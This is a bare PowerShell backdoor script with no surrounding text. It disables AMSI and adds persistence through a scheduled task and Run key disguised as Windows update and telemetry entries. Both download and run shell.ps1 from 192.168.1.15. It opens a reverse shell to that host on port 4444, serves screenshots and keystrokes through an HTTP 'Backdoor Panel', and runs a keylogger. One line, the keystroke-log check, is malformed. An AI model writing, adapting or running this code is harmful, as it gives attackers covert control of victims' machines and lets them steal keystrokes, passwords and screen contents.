powershell -nop -w hidden -c "
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

`$taskcmd = 'powershell -nop -w hidden -c `"&{IEX((New-Object Net.WebClient).DownloadString(`'http://192.168.1.15/shell.ps1`'))}`"';
schtasks /create /tn 'WindowsUpdateCheck' /tr `$taskcmd /sc onlogon /rl highest /f 2>`$null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsTelemetry' -Value `$taskcmd -Force 2>`$null;

Start-Job -ScriptBlock {
    while (`$true) {
        try {
            `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);
            `$stream = `$client.GetStream(); [byte[]]`$bytes = 0..65535|%{0};
            while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) {
                `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);
                `$sendback = (iex `$data 2>&1 | Out-String );
                `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
                `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
                `$stream.Write(`$sendbyte,0,`$sendbyte.Length); `$stream.Flush();
            }; `$client.Close()
        } catch { Start-Sleep 5 }
    }
}

Start-Job -ScriptBlock {
    `$listener = New-Object System.Net.HttpListener; `$listener.Prefixes.Add('http://*:8080/'); `$listener.Start();
    `$html = '<html><body><h1>Backdoor Panel</h1><a href=/webcam>Webcam</a> <a href=/screen>Screen</a> <a href=/keys>Keys</a></body></html>';
    while (`$listener.IsListening) {
        try {
            `$ctx = `$listener.GetContext(); `$req = `$ctx.Request; `$res = `$ctx.Response;
            switch(`$req.Url.AbsolutePath) {
                '/' { `$buf = [Text.Encoding]::UTF8.GetBytes(`$html); `$res.ContentLength64 = `$buf.Length; `$res.OutputStream.Write(`$buf,0,`$buf.Length) }
                '/screen' { 
                    Add-Type -AssemblyName System.Drawing;
                    `$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
                    `$bmp = New-Object System.Drawing.Bitmap(`$bounds.Width, `$bounds.Height);
                    `$g = [System.Drawing.Graphics]::FromImage(`$bmp);
                    `$g.CopyFromScreen(`$bounds.Location, [System.Drawing.Point]::Empty, `$bounds.Size);
                    `$mem = New-Object System.IO.MemoryStream; `$bmp.Save(`$mem, [System.Drawing.Imaging.ImageFormat]::Jpeg);
                    `$res.ContentType = 'image/jpeg'; `$res.ContentLength64 = `$mem.Length; `$mem.WriteTo(`$res.OutputStream);
                }
                '/keys' { `$log = 'C:\temp\keys.txt' -ne (Test-Path) ? 'No keys yet' : (Get-Content `$log -Raw); `$buf = [Text.Encoding]::UTF8.GetBytes(`$log); `$res.OutputStream.Write(`$buf,0,`$buf.Length) }
            }
            `$res.Close()
        } catch { }
    }
}

mkdir C:\temp -Force 2>`$null; Start-Job -ScriptBlock {
    Add-Type @'
    using System; using System.Runtime.InteropServices; using System.IO;
    public class KL { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        public static void Log() { while(true) { for(int i=8;i<=255;i++) { if(GetAsyncKeyState(i)==-32767) File.AppendAllText(@"C:\temp\keys.txt", ((char)i).ToString()); } System.Threading.Thread.Sleep(10); } }
    }
'@; [KL]::Log()
}

Write-Host 'Backdoor deployed' -f green; Start-Sleep 9999
"
